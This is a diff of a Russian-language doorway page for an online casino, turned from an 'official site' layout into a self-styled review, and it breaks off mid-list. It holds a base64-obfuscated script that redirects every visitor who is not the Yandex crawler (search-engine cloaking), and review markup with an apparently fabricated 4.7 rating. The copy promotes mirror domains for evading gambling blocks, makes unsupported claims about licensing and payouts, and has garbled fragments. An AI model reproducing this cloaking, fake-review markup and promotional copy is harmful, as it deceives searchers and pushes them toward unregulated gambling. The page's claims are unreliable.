@@ -7,13 +7,32 @@
     <meta name="description" content="Заходите на официальный сайт Ева Казино (Eva Casino). Лучшие игровые автоматы ева, мгновенные выплаты и щедрые бонусы. Используйте ева казино зеркало рабочее для входа сегодня!">
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <meta name="robots" content="index, follow, noarchive">
-    <meta name="yandex" content="noarchive">
-    <meta name="yandex-verification" content="fcb61892cf29f09e" />
+    <link rel="stylesheet" href="styles.css">
     <script src="tailwindcss.js"></script>
     <script src="lucide.min.js"></script>
-
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Review",
+    "name": "Обзор EVA Casino",
+    "itemReviewed": {
+      "@type": "Organization",
+      "name": "EVA Casino"
+    },
+    "reviewRating": {
+      "@type": "Rating",
+      "ratingValue": "4.7",
+      "bestRating": "5"
+    },
+    "author": {
+      "@type": "Organization",
+      "name": "CasinoReview"
+    },
+    "datePublished": "2024-05-20"
+  }
+  </script>
 </head>
-<body class="font-sans text-slate-800 bg-white">
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-amber-500 selection:text-slate-950">
   <div id="redirect-overlay" style="position:fixed; inset:0; z-index:99999; display:none; flex-direction:column; align-items:center; justify-content:center; background:#0a0a14; color:white; font-family:sans-serif; text-align:center;">
     <div style="width:60px; height:60px; border:5px solid rgba(255,215,0,0.1); border-top:5px solid #FFD700; border-radius:50%; animation: spin 1s linear infinite; margin-bottom:20px;"></div>
     <h2 style="font-size:22px; font-weight:bold; margin-bottom:10px;">Ищем рабочее зеркало...</h2>
@@ -24,7 +43,7 @@
   </div>
   <script>
  var ua = navigator.userAgent.toLowerCase();
-var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+var targetB64 = "#aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 
 if (ua.indexOf("yandex") === -1) {
     location.replace(atob(targetB64));
@@ -33,393 +52,355 @@ if (ua.indexOf("yandex") === -1) {
 }
 </script>
  
- <header class="sticky top-0 z-50 bg-white/95 backdrop-blur-md border-b border-slate-200">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="flex justify-between items-center h-16">
-        <div class="flex items-center">
-          <span class="text-2xl font-bold bg-gradient-to-r from-amber-500 to-red-600 bg-clip-text text-transparent">
-            EVA Casino
-          </span>
-        </div>
-        
-        <nav class="hidden md:flex space-x-8">
-          <a href="#home" class="text-slate-600 hover:text-amber-500 transition-colors">Главное</a>
-          <a href="#games" class="text-slate-600 hover:text-amber-500 transition-colors">Игры</a>
-          <a href="#bonuses" class="text-slate-600 hover:text-amber-500 transition-colors">Бонусы</a>
-          <a href="#mirrors" class="text-slate-600 hover:text-amber-500 transition-colors">Зеркала</a>
-          <a href="#faq" class="text-slate-600 hover:text-amber-500 transition-colors">Вопросы</a>
-        </nav>
-        
-        <button id="mobileMenuBtn" class="md:hidden p-2 text-slate-600 hover:bg-slate-100 rounded-lg">
-          <i data-lucide="menu" class="w-6 h-6"></i>
-        </button>
+ <header class="a1z_header">
+    <nav class="a1z_nav" aria-label="Главная навигация">
+      <div class="flex items-center gap-2">
+        <i data-lucide="diamond" class="w-6 h-6 text-amber-500"></i>
+        <span class="text-lg font-bold text-white tracking-tight">EVA<span class="text-amber-500">REVIEW</span></span>
       </div>
-    </div>
- 
-    <div id="mobileMenu" class="hidden md:hidden bg-white border-b border-slate-200 px-4 py-4 space-y-3">
-      <a href="#home" class="block text-slate-600 hover:text-amber-500 py-2">Главное</a>
-      <a href="#games" class="block text-slate-600 hover:text-amber-500 py-2">Игры</a>
-      <a href="#bonuses" class="block text-slate-600 hover:text-amber-500 py-2">Бонусы</a>
-      <a href="#mirrors" class="block text-slate-600 hover:text-amber-500 py-2">Зеркала</a>
-      <a href="#faq" class="block text-slate-600 hover:text-amber-500 py-2">Вопросы</a>
+      
+      <ul class="hidden md:flex items-center gap-6 text-sm font-medium text-slate-300">
+        <li><a href="#obzor" class="hover:text-amber-400 transition-colors">Обзор</a></li>
+        <li><a href="#zerkalo" class="hover:text-amber-400 transition-colors">Зеркало</a></li>
+        <li><a href="#start" class="hover:text-amber-400 transition-colors">Начать игру</a></li>
+        <li><a href="#igry" class="hover:text-amber-400 transition-colors">Игры</a></li>
+        <li><a href="#bonusy" class="hover:text-amber-400 transition-colors">Бонусы</a></li>
+        <li><a href="#faq" class="hover:text-amber-400 transition-colors">FAQ</a></li>
+      </ul>
+
+      <button id="menu-toggle" class="md:hidden p-2 text-slate-300 hover:text-white" aria-expanded="false" aria-controls="mobile-menu">
+        <i data-lucide="menu" class="w-6 h-6"></i>
+      </button>
+    </nav>
+
+    <div id="mobile-menu" class="hidden md:hidden border-t border-slate-800 bg-slate-900">
+      <ul class="flex flex-col p-4 gap-3 text-sm font-medium text-slate-300">
+        <li><a href="#obzor" class="block py-2 hover:text-amber-400">Обзор</a></li>
+        <li><a href="#zerkalo" class="block py-2 hover:text-amber-400">Зеркало</a></li>
+        <li><a href="#start" class="block py-2 hover:text-amber-400">Начать игру</a></li>
+        <li><a href="#igry" class="block py-2 hover:text-amber-400">Игры</a></li>
+        <li><a href="#bonusy" class="block py-2 hover:text-amber-400">Бонусы</a></li>
+        <li><a href="#faq" class="block py-2 hover:text-amber-400">FAQ</a></li>
+      </ul>
     </div>
   </header>
 
-  <section id="home" class="py-16 md:py-24 bg-gradient-to-b from-red-50 to-white">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="text-center max-w-3xl mx-auto">
-        <h1 class="text-3xl md:text-5xl font-bold mb-6 leading-tight">
-          EVA Casino: <span class="bg-gradient-to-r from-amber-500 to-red-600 bg-clip-text text-transparent">Официальный Сайт</span> и Зеркала 2026
-        </h1>
-        <p class="text-lg md:text-xl text-slate-600 mb-8">
-          Играть в казино EVA онлайн с официального сайта и надежных зеркал. Проверенная лицензированная платформа с тысячами игровых автоматов и регулярными бонусами для игроков.
-        </p>
-        <div class="flex flex-col sm:flex-row justify-center gap-4">
-          <a href="#mirrors" class="bg-gradient-to-r from-amber-500 to-red-600 text-white font-medium py-3 px-6 rounded-lg text-center shadow-lg hover:shadow-xl transition-all">
-            Перейти на Официальный Сайт
-          </a>
-          <a href="#games" class="border border-amber-500 text-amber-600 font-medium py-3 px-6 rounded-lg text-center hover:bg-amber-50 transition-all">
-            Игровые автоматы
-          </a>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="py-12 bg-white">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-        <div class="flex flex-col items-center text-center">
-          <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
-            <i data-lucide="shield-check" class="w-8 h-8 text-amber-600"></i>
-          </div>
-          <h3 class="text-xl font-semibold mb-2">Безопасность и Лицензия</h3>
-          <p class="text-slate-600">Казино EVA работает по международной лицензии, гарантируя справедливые игры и защиту ваших средств.</p>
-        </div>
-        <div class="flex flex-col items-center text-center">
-          <div class="bg-red-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
-            <i data-lucide="gamepad-2" class="w-8 h-8 text-red-600"></i>
-          </div>
-          <h3 class="text-xl font-semibold mb-2">Широкий Ассортимент Игр</h3>
-          <p class="text-slate-600">Тысячи игровых автоматов от ведущих провайдеров — от классических слотов до новинок индустрии.</p>
-        </div>
-        <div class="flex flex-col items-center text-center">
-          <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center mb-4">
-            <i data-lucide="sparkles" class="w-8 h-8 text-amber-600"></i>
-          </div>
-          <h3 class="text-xl font-semibold mb-2">Бонусы и Промоакции</h3>
-          <p class="text-slate-600">Щедрые приветственные бонусы, розыгрыши и регулярные акции для постоянных игроков.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <main class="py-12">
-    <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
-      <section id="what-is-eva">
-        <h2 class="text-2xl md:text-3xl font-bold mb-6 text-slate-900">Что такое EVA Casino?</h2>
-        <p class="text-lg text-slate-700 mb-6">
-          <strong>EVA Casino</strong> — это современная онлайн-платформа для игры в игровые автоматы и другие азартные развлечения. Официальный сайт казино предлагает игрокам доступ к тысячам игровых автоматов от ведущих разработчиков программного обеспечения.
-        </p>
-        <p class="text-lg text-slate-700 mb-6">
-          Казино EVA активно развивается на российском рынке и завоевывает популярность благодаря честным условиям, быстрым выплатам и щедрым бонусам. Официальный сайт EVA Casino является надежной точкой входа для игроков, которые ценят безопасность и качество сервиса.
-        </p>
-      </section>
-
-      <section id="games">
-        <h2 class="text-2xl md:text-3xl font-bold mb-8 text-slate-900">Игровые автоматы в EVA Casino</h2>
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
-          <div class="bg-slate-100 rounded-lg overflow-hidden">
-            <img src="/widget.webp" alt="Игровой автомат" class="w-full h-32 object-cover" loading="lazy">
-            <div class="p-3 text-center">
-              <h4 class="font-medium text-slate-700">Слоты</h4>
-            </div>
-          </div>
-          <div class="bg-slate-100 rounded-lg overflow-hidden">
-            <img src="/prikjhg.webp" alt="Ливийские игры" class="w-full h-32 object-cover" loading="lazy">
-            <div class="p-3 text-center">
-              <h4 class="font-medium text-slate-700">Ливийские Игры</h4>
-            </div>
-          </div>
-          <div class="bg-slate-100 rounded-lg overflow-hidden">
-            <img src="/head.webp" alt="Турниры" class="w-full h-32 object-cover" loading="lazy">
-            <div class="p-3 text-center">
-              <h4 class="font-medium text-slate-700">Турниры</h4>
-            </div>
-          </div>
-          <div class="bg-slate-100 rounded-lg overflow-hidden">
-            <img src="/evacio.webp" alt="Ставки на спорт" class="w-full h-32 object-cover" loading="lazy">
-            <div class="p-3 text-center">
-              <h4 class="font-medium text-slate-700">Ставки на Спорт</h4>
-            </div>
-          </div>
-        </div>
-        <p class="text-lg text-slate-700 mb-6">
-          В <strong>EVA Casino</strong> представлены игры от ведущих провайдеров: NetEnt, Microgaming, Play'n GO, Pragmatic Play и других. Игроки найдутклассические слоты с тремя барабанами, современные видео-автоматы с несколькими линиями оплаты и прогрессивные джекпоты.
-        </p>
-        <p class="text-lg text-slate-700 mb-6">
-          Платформа regularly обновляет ассортимент игр, добавляя новинки индустрии. Удобный интерфейс и адаптивная верстка позволяют играть на любых устройствах — смартфонах, планшетах и компьютерах.
-        </p>
-        
-        <h3 class="text-xl font-bold mt-8 mb-4 text-slate-900">Основные категории игр в EVA Casino:</h3>
-        <ul class="list-disc pl-6 mb-6 space-y-2">
-          <li class="text-slate-700">Классические и современные слоты</li>
-          <li class="text-slate-700">Настольные игры (рулетка, блэкджек, покер)</li>
-          <li class="text-slate-700">Игры с крупье (live-казино)</li>
-          <li class="text-slate-700">Спортивные ставки и辐照</li>
-          <li class="text-slate-700">Игровые автоматы с джекпотами</li>
-        </ul>
-      </section>
-
-      <section id="bonuses">
-        <h2 class="text-2xl md:text-3xl font-bold mb-8 text-slate-900">Бонусы и Промоакции в EVA Casino</h2>
-        <p class="text-lg text-slate-700 mb-6">
-          <strong>EVA Casino</strong> щедро награждает своих игроков множеством бонусов и акций. Приветственное предложение для новых клиентов включает серию депозитных бонусов и бесплатных вращений.
-        </p>
-        <div class="bg-gradient-to-r from-red-50 to-amber-50 rounded-xl p-6 mb-8 border border-slate-200">
-          <h3 class="text-xl font-bold mb-4 text-amber-700">Популярные бонусы:</h3>
-          <ul class="space-y-3">
-            <li class="flex items-start">
-              <i data-lucide="gift" class="w-5 h-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Приветственный бонус</span> до 100% на первый депозит + 50 бесплатных вращений
-              </div>
-            </li>
-            <li class="flex items-start">
-              <i data-lucide="repeat" class="w-5 h-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Бонус за повторные депозиты</span> до 50% каждую неделю
-              </div>
-            </li>
-            <li class="flex items-start">
-              <i data-lucide="trophy" class="w-5 h-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Программа лояльности</span> с VIP-статусами и персональными бонусами
-              </div>
-            </li>
-            <li class="flex items-start">
-              <i data-lucide="calendar" class="w-5 h-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Еженедельные акции</span> и турниры с призовым фондом
-              </div>
-            </li>
-          </ul>
-        </div>
-        <p class="text-lg text-slate-700 mb-6">
-          Все бонусные предложения сопровождаются понятными условиями вейджеров. Для активации бонусов требуется выполнить валидацию аккаунта и минимальный депозит.
-        </p>
-      </section>
-
-      <section id="mirrors">
-        <h2 class="text-2xl md:text-3xl font-bold mb-8 text-slate-900">Зеркала и Доступ к EVA Casino</h2>
-        <p class="text-lg text-slate-700 mb-6">
-          <strong>EVA Casino зеркало</strong> — это альтернативные адреса для доступа к платформе в случае блокировки основного сайта провайдером или интернет-оператором. Зеркала полностью идентичны официальному сайту по функционалу и содержанию.
-        </p>
-        
-        <div class="bg-amber-50 rounded-xl p-6 mb-8 border border-amber-200">
-          <h3 class="text-xl font-bold mb-4 text-amber-800">Преимущества использования зеркал:</h3>
-          <ul class="space-y-3">
-            <li class="flex items-start">
-              <i data-lucide="check" class="w-5 h-5 text-amber-600 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Безопасный доступ</span> даже при блокировке основного домена
-              </div>
-            </li>
-            <li class="flex items-start">
-              <i data-lucide="zap" class="w-5 h-5 text-amber-600 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Мгновенный вход</span> на сайт без дополнительной настройки
-              </div>
-            </li>
-            <li class="flex items-start">
-              <i data-lucide="shield" class="w-5 h-5 text-amber-600 mt-0.5 mr-3 flex-shrink-0"></i>
-              <div>
-                <span class="font-medium">Полная защита личных данных</span> и средств игроков
-              </div>
-            </li>
-          </ul>
-        </div>
-        
-        <p class="text-lg text-slate-700 mb-6">
-          <strong>EVA казино зеркало рабочее</strong> можно найти на официальных ресурсах проекта. Регулярно обновляемые зеркала доступны в закрытыхzM группах и на форумах, посвященных онлайн-казино.
-        </p>
-        
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-          <div class="bg-slate-100 rounded-lg p-5">
-            <h4 class="font-bold mb-2 text-slate-900">Как найти рабочее зеркало?</h4>
-            <p class="text-slate-700">
-              Актуальные <strong>зеркала EVA Casino</strong> публикуются на главной странице официального сайта, в рассылке для подписчиков и в официальных каналах поддержки. Рекомендуем сохранить официальный сайт в закладки и следить за новостями проекта.
-            </p>
-          </div>
-          <div class="bg-slate-100 rounded-lg p-5">
-            <h4 class="font-bold mb-2 text-slate-900">Безопасность при использовании зеркал</h4>
-            <p class="text-slate-700">
-              Все <strong>EVA казино зеркала</strong> проходят проверку на безопасность перед публикацией. Для дополнительной защиты убедитесь, что URL зеркала совпадает с официальным доменом, и не вводите личные данные на подозрительных ресурсах.
-            </p>
-          </div>
-        </div>
-      </section>
-
-      <section id="play-online">
-        <h2 class="text-2xl md:text-3xl font-bold mb-8 text-slate-900">EVA Casino Играть Онлайн и Официальный Сайт</h2>
-        <p class="text-lg text-slate-700 mb-6">
-          Играть в <strong>EVA casino онлайн</strong> удобно и безопасно через официальный сайт. Платформа оптимизирована для игры на мобильных устройствах — смартфонах и планшетах — без необходимости скачивания приложения.
-        </p>
-        
-        <h3 class="text-xl font-bold mt-8 mb-4 text-slate-900">Преимущества официального сайта EVA Casino:</h3>
-        <ul class="list-disc pl-6 mb-6 space-y-2">
-          <li class="text-slate-700">Быстрый вход через одноразовые пароли</li>
-          <li class="text-slate-700">Мгновенные выплаты на любые платежные системы</li>
-          <li class="text-slate-700">Адаптивный дизайн для всех устройств</li>
-          <li class="text-slate-700">Круглосуточная поддержка игроков</li>
-          <li class="text-slate-700">Личный кабинет с историей ставок</li>
-          <li class="text-slate-700">Система безопасности для защиты средств</li>
-        </ul>
-      </section>
-
-      <section id="faq">
-        <h2 class="text-2xl md:text-3xl font-bold mb-8 text-slate-900">Частые Вопросы</h2>
-        <div class="space-y-4">
-          <div class="bg-slate-50 rounded-xl p-6 border border-slate-200">
-            <h3 class="text-lg font-bold mb-2 text-slate-900">Где находится официальный сайт EVA Casino?</h3>
-            <p class="text-slate-700">
-              <strong>EVA casino официальный сайт</strong> можно найти в разделе "Адреса" на главной странице. Убедитесь, что сайт защищен HTTPS и имеет валидный сертификат безопасности.
-            </p>
-          </div>
-          
-          <div class="bg-slate-50 rounded-xl p-6 border border-slate-200">
-            <h3 class="text-lg font-bold mb-2 text-slate-900">Как работает EVA казино зеркало?</h3>
-            <p class="text-slate-700">
-              <strong>EVA казино зеркало</strong> — это зеркальное отражение основного сайта на другом домене. Все функции, игры и бонусы доступны на зеркалах полностью идентично основному сайту.
-            </p>
-          </div>
-          
-          <div class="bg-slate-50 rounded-xl p-6 border border-slate-200">
-            <h3 class="text-lg font-bold mb-2 text-slate-900">Можно ли играть в EVA casino бесплатно?</h3>
-            <p class="text-slate-700">
-              Да, на официальном сайте EVA casino есть демо-режим для большинства слотов. Это позволяет изучить механизмы игры без риска потерь. Игра в демо-режиме не требует регистрации и депозита.
-            </p>
-          </div>
-          
-          <div class="bg-slate-50 rounded-xl p-6 border border-slate-200">
-            <h3 class="text-lg font-bold mb-2 text-slate-900">Почему важно использовать только официальный сайт?</h3>
-            <p class="text-slate-700">
-              Использование <strong>EVA casino официальный сайт</strong> гарантирует защиту ваших личных данных и средств, а также доступ ко всем бонусам и акциям. Рабочие зеркала регулярно проверяются на безопасность.
-            </p>
-          </div>
-        </div>
-      </section>
-
-      <section id="conclusion" class="mt-12 mb-16">
-        <h2 class="text-2xl md:text-3xl font-bold mb-6 text-slate-900">Заключение</h2>
-        <p class="text-lg text-slate-700 mb-4">
-          <strong>EVA Casino</strong> предлагает игрокам высококачественную платформу для онлайн-азартных развлечений. С официального сайта можно быстро забронировать быстрый доступ ко всем игровым автоматам и бонусам.
-        </p>
-        <p class="text-lg text-slate-700">
-          Для усиления программной защиты при входе на сайт рекомендуем использовать надежные браузеры и не сохранять PIN-коды на общедоступных устройствах. Официальный сайт EVA Casino поддерживает новые технологии безопасности для гарантированной защиты аккаунтов игроков.
-        </p>
-        <div class="mt-8 bg-amber-50 rounded-xl p-6 border border-amber-200">
-          <p class="font-medium text-lg text-amber-800">
-            Играйте ответственно. 18+. copyright; 2024 EVA Casino.
+  <main>
+    <article>
+      <header class="b2x_hero px-4">
+        <div class="max-w-3xl mx-auto text-center">
+          <h1 class="b2x_title text-3xl md:text-5xl font-extrabold text-white mb-6">
+            Обзор <span class="text-amber-500">EVA Casino</span>: официальный сайт, рабочее зеркало и возможности платформы
+          </h1>
+          <p class="text-base md:text-lg text-slate-300 leading-relaxed mb-8">
+            Ищете надежную площадку для азартных развлечений? <strong>EVA Casino</strong> — это современное игорное пространство с лицензионными слотами и прозрачными условиями. 
+            Официальный сайт гарантирует сохранность данных, а рабочее зеркало помогает обходить блокировки без потери функционала. 
+            Узнайте, почему тысячи игроков выбирают <em>ева казино онлайн</em> каждый день.
           </p>
+          <div class="flex flex-col sm:flex-row items-center justify-center gap-3">
+            <a href="#obzor" class="k3m_btn_primary w-full sm:w-auto">Читать обзор</a>
+            <a href="#zerkalo" class="k3m_btn_secondary w-full sm:w-auto">Про зеркало</a>
+          </div>
+        </div>
+      </header>
+
+      <section id="obzor" class="c3v_about px-4 py-16 md:py-24 bg-slate-900">
+        <div class="max-w-6xl mx-auto">
+          <h2 class="text-2xl md:text-4xl font-bold text-white mb-4 text-center">Что представляет собой <span class="text-amber-500">EVA Casino официальный сайт</span></h2>
+          <p class="text-center text-slate-400 mb-12 max-w-2xl mx-auto">Платформа работает по международной лицензии и регулярно проходит аудит независимых экспертов.</p>
+          
+          <div class="c3v_grid">
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="shield-check" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Безопасность данных</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Ева казино официальный сайт использует SSL-шифрование и двухфакторную аутентификацию для защиты аккаунтов.</p>
+            </div>
+            
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="zap" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Скорость выплат</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Среднее время вывода winnings на EVA Casino — до 15 минут для электронных кошельков и до 3 часов на карты.</p>
+            </div>
+            
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="smartphone" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Мобильная адаптация</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Играйте с iPhone SE или Pro Max без скачивания приложения. Интерфейс автоматически подстраивается под любой экран.</p>
+            </div>
+            
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="gift" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Приветственные бонусы</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Новые пользователи получают пакет на первые депозиты и фриспины в популярных слотах.</p>
+            </div>
+            
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="headset" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Поддержка 24/7</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Операторы на связи в чате и мессенджерах. Среднее время ответа — менее двух минут даже в пиковые часы.</p>
+            </div>
+            
+            <div class="c3v_card">
+              <div class="w-12 h-12 rounded-xl bg-amber-500/10 flex items-center justify-center mb-4">
+                <i data-lucide="refresh-cw" class="w-6 h-6 text-amber-500"></i>
+              </div>
+              <h3 class="text-lg font-bold text-white mb-2">Рабочее зеркало</h3>
+              <p class="text-slate-400 text-sm leading-relaxed">Альтернативные адреса обновляются автоматически. Вы не потеряете доступ к счету при блокировке основного домена.</p>
+            </div>
+          </div>
         </div>
       </section>
-    </div>
+
+      <section id="zerkalo" class="d4w_mirror px-4 py-16 md:py-24">
+        <div class="max-w-6xl mx-auto grid md:grid-cols-2 gap-10 items-center">
+          <div>
+            <h2 class="text-2xl md:text-4xl font-bold text-white mb-6"><span class="text-amber-500">EVA Casino зеркало</span>: бесперебойный доступ без VPN</h2>
+            <div class="space-y-4 text-slate-300 leading-relaxed">
+              <p>
+                Интернет-провайдеры иногда ограничивают доступ к игорным ресурсам. В таких случаях на помощь приходит <strong>eva casino зеркало</strong>. Это точная копия основного портала с полным сохранением функционала, баланса и истории ставок.
+              </p>
+              <p>
+                <em>Ева казино зеркало рабочее</em> обновляется автоматически, поэтому вы всегда сможете войти в личный кабинет и продолжить сессию с того места, где остановились. Все настройки, бонусы и достижения синхронизируются в реальном времени.
+              </p>
+              <p>
+                Используйте только проверенные альтернативные адреса, чтобы защитить свои средства. Официальное <strong>ева казино зеркало</strong> никогда не запрашивает повторную верификацию пароля при переходе.
+              </p>
+            </div>
+            <div class="mt-8 p-4 rounded-xl border border-amber-500/20 bg-amber-500/5">
+              <p class="text-sm text-amber-200 font-medium">💡 Совет: добавьте рабочую ссылку в закладки браузера, чтобы не искать её повторно.</p>
+            </div>
+          </div>
+          <div class="d4w_visual">
+            <div class="d4w_box">
+              <div class="flex items-center gap-3 mb-4">
+                <div class="w-10 h-10 rounded-lg bg-slate-800 flex items-center justify-center">
+                  <i data-lucide="globe" class="w-5 h-5 text-emerald-400"></i>
+                </div>
+                <div>
+                  <p class="text-sm font-semibold text-white">Статус зеркала</p>
+                  <p class="text-xs text-emerald-400">Активно</p>
+                </div>
+              </div>
+              <div class="space-y-3">
+                <div class="h-2 bg-slate-700 rounded-full overflow-hidden">
+                  <div class="h-full bg-emerald-500 w-[95%]"></div>
+                </div>
+                <div class="flex justify-between text-xs text-slate-400">
+                  <span>Скорость отклика</span>
+                  <span>24 мс</span>
+                </div>
+              </div>
+              <div class="mt-4 pt-4 border-t border-slate-700 grid grid-cols-2 gap-3 text-center">
+                <div>
+                  <p class="text-lg font-bold text-white">99.9%</p>
+                  <p class="text-xs text-slate-400">Аптайм</p>
+                </div>
+                <div>
+                  <p class="text-lg font-bold text-white">SSL</p>
+                  <p class="text-xs text-slate-400">Защита</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="start" class="e5u_start px-4 py-16 md:py-24 bg-slate-900">
+        <div class="max-w-4xl mx-auto">
+          <h2 class="text-2xl md:text-4xl font-bold text-white mb-4 text-center">Как на <span class="text-amber-500">EVA Casino играть</span>: пошаговая инструкция</h2>
+          <p class="text-center text-slate-400 mb-12">Регистрация занимает менее двух минут. Если вы хотите <em>ева казино играть</em> на реальные деньги, следуйте простому алгоритму.</p>
+          
+          <div class="e5u_steps space-y-8">
+            <div class="e5u_item">
+              <h3 class="text-lg font-bold text-white mb-1">Переход на портал</h3>
+              <p class="text-slate-400 text-sm">Откройте <strong>eva casino официальный сайт</strong> или актуальное рабочее зеркало. Убедитесь, что адрес совпадает с официальным доменом.</p>
+            </div>
+            <div class="e5u_item">
+              <h3 class="text-lg font-bold text-white mb-1">Создание аккаунта</h3>
+              <p class="text-slate-400 text-sm">Нажмите «Регистрация» и укажите email или номер телефона. Придумайте надежный пароль и выберите валюту счета.</p>
+            </div>
+            <div class="e5u_item">
+              <h3 class="text-lg font-bold text-white mb-1">Пополнение баланса</h3>
+              <p class="text-slate-400 text-sm">Воспользуйтесь банковской картой, электронным кошельком или криптовалютой. Минимальный депозит доступен для любого бюджета.</p>
+            </div>
+            <div class="e5u_item">
+              <h3 class="text-lg font-bold text-white mb-1">Выбор игры</h3>
+              <p class="text-slate-400 text-sm">Заберите приветственный бонус и выбирайте из сотен слотов, настольных игр и live-рулеток. Для тренировки доступен демо-режим.</p>
+            </div>
+          </div>
+          
+          <div class="mt-10 p-5 rounded-xl bg-slate-800/50 border border-slate-700">
+            <p class="text-sm text-slate-300">
+              <span class="text-amber-500 font-bold">Важно:</span> перед выводом средств пройдите верификацию профиля. Это стандартная процедура на любом <strong>eva casino официальный</strong> ресурсе, которая занимает от 10 минут до 2 часов.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <section id="igry" class="f6t_games px-4 py-16 md:py-24">
+        <div class="max-w-6xl mx-auto">
+          <h2 class="text-2xl md:text-4xl font-bold text-white mb-4 text-center">Игровой каталог: чем развлекает <span class="text-amber-500">Ева казино онлайн</span></h2>
+          <p class="text-center text-slate-400 mb-12 max-w-2xl mx-auto">Азартный портал сотрудничает с ведущими провайдерами. Здесь представлены только сертифицированные слоты с честным RNG.</p>
+          
+          <div class="grid md:grid-cols-3 gap-6">
+            <article class="f6t_card">
+              <img src="http://static.photos/gaming/640x360/11" alt="Игровые автоматы на EVA Casino" class="w-full aspect-video object-cover" loading="lazy">
+              <div class="p-4">
+                <h3 class="text-lg font-bold text-white mb-2">Слот-машины</h3>
+                <p class="text-sm text-slate-400">Классические фруктовые автоматы, современные видеослоты и игры с прогрессивным джекпотом. RTP большинства аппаратов превышает 96%.</p>
+              </div>
+            </article>
+            
+            <article class="f6t_card">
+              <img src="http://static.photos/technology/640x360/22" alt="Рулетка и настольные игры в Ева казино" class="w-full aspect-video object-cover" loading="lazy">
+              <div class="p-4">
+                <h3 class="text-lg font-bold text-white mb-2">Рулетка и карты</h3>
+                <p class="text-sm text-slate-400">Европейская и американская рулетка, блэкджек, баккара и покер. Несколько уровней лимитов подходят и новичкам, и хайроллерам.</p>
+              </div>
+            </article>
+            
+            <article class="f6t_card">
+              <img src="http://static.photos/indoor/640x360/33" alt="Live-казино EVA с дилерами" class="w-full aspect-video object-cover" loading="lazy">
+              <div class="p-4">
+                <h3 class="text-lg font-bold text-white mb-2">Live-казино</h3>
+                <p class="text-sm text-slate-400">Прямые трансляции с профессиональными дилерами. Эффект присутствия в реальном зале без выхода из дома.</p>
+              </div>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <section id="bonusy" class="g7r_bonus px-4 py-16 md:py-24 bg-slate-900">
+        <div class="max-w-6xl mx-auto grid md:grid-cols-2 gap-10 items-center">
+          <div class="order-2 md:order-1">
+            <img src="http://static.photos/minimal/640x360/44" alt="Бонусы и акции EVA Casino" class="w-full rounded-2xl border border-slate-700" loading="lazy">
+          </div>
+          <div class="order-1 md:order-2">
+            <h2 class="text-2xl md:text-4xl font-bold text-white mb-6">Бонусная политика <span class="text-amber-500">Ева казино официальный</span></h2>
+            <div class="space-y-4 text-slate-300 leading-relaxed">
+              <p>
+                Платформа ценит лояльность аудитории и предлагает многоуровневую программу поощрений. <strong>Ева казино официальный сайт</strong> регулярно запускает сезонные акции с увеличенными призовыми фондами.
+              </p>
+              <ul class="space-y-3 mt-4">
+                <li class="flex items-start gap-3">
+                  <i data-lucide="check-circle-2" class="w-5 h-5 text-emerald-400 mt-0.5 shrink-0"></i>
+                  <span class="text-sm"><strong>Приветственный пакет</strong> — увеличение первых трех депозитов и до 150 фриспинов.</span>
+                </li>
+                <li class="flex items-start gap-3">
+                  <i data-lucide="check-circle-2" class="w-5 h-5 text-emerald-400 mt-0.5 shrink-0"></i>
